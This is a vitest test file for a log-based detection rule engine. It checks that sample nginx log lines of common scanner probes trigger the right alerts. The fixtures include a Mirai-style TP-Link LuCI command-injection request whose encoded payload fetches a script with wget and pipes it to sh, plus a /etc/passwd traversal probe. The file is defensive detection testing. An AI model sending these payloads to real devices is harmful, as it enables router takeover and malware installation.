import { randomUUID } from 'node:crypto';
import { describe, expect, it } from 'vitest';
import { createRuleEngine, RULES } from '../../src/detection/index.js';
import { InMemoryWindowStore } from '../../src/detection/window-store.js';
import { InMemoryBaselineStore } from '../../src/detection/baseline-store.js';
import { parseRawLog } from '../../src/parser/index.js';

// What internet scanners actually send to a fresh public HTTPS host, as nginx
// logs it (escaping included) — the shape of the probe log the generator ships
// from the deploy VM. IPs swapped for documentation ranges.
const T = '[17/Oct/2026:20:01:02 +0000]';
const LINES = {
  envProbe: `192.0.2.10 - - ${T} "GET /.env HTTP/1.1" 404 162 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"`,
  wordpress: `192.0.2.10 - - ${T} "GET /wp-login.php HTTP/1.1" 404 162 "-" "Mozilla/5.0"`,
  // Mirai-style TP-Link LuCI exploit
  routerRce: `192.0.2.20 - - ${T} "GET /cgi-bin/luci/;stok=/locale?form=country&operation=write&country=$(id%3E%60wget+http%3A%2F%2F192.0.2.20%2Ft+-O-+|+sh%60) HTTP/1.1" 404 162 "-" "Go-http-client/1.1"`,
  traversal: `192.0.2.30 - - ${T} "GET /static/../../../../etc/passwd HTTP/1.1" 400 157 "-" "curl/7.88.1"`,
  zgrab: `192.0.2.40 - - ${T} "GET /favicon.ico HTTP/1.1" 404 162 "-" "Mozilla/5.0 zgrab/0.x"`,
  // a TLS ClientHello sent to the plain-HTTP port — nginx logs the raw bytes
  tlsOnHttp: `192.0.2.50 - - ${T} "\\x16\\x03\\x01\\x00\\xCA\\x01\\x00\\x00\\xC6\\x03\\x03" 400 157 "-" "-"`,
};

const raw = (message: string) => ({
  eventId: randomUUID(),
  timestamp: '2026-10-17T20:01:02.000Z',
  source: 'nginx' as const,
  message,
});

describe('real-world scanner traffic', () => {
  it('turns typical probes into the right alerts', async () => {
    const engine = createRuleEngine(RULES, new InMemoryWindowStore(), new InMemoryBaselineStore());
    const fired: Record<string, string[]> = {};
    for (const [name, line] of Object.entries(LINES)) {
      const event = parseRawLog(raw(line));
      fired[name] = event ? (await engine.evaluate(event)).map((a) => a.ruleId) : ['<unparsed>'];
    }
    expect(fired.envProbe).toContain('dir-enumeration');
    // same scanner, same rule, inside the throttle window: suppressed, not re-alerted
    expect(fired.wordpress).toEqual([]);
    expect(fired.routerRce).toContain('command-injection');
    expect(fired.traversal).toContain('path-traversal');
    expect(fired.zgrab).toContain('scanner-user-agent');
    // garbage on the wire is skipped (counted as a parse failure), not a crash
    expect(fired.tlsOnHttp).toEqual(['<unparsed>']);
  });
});
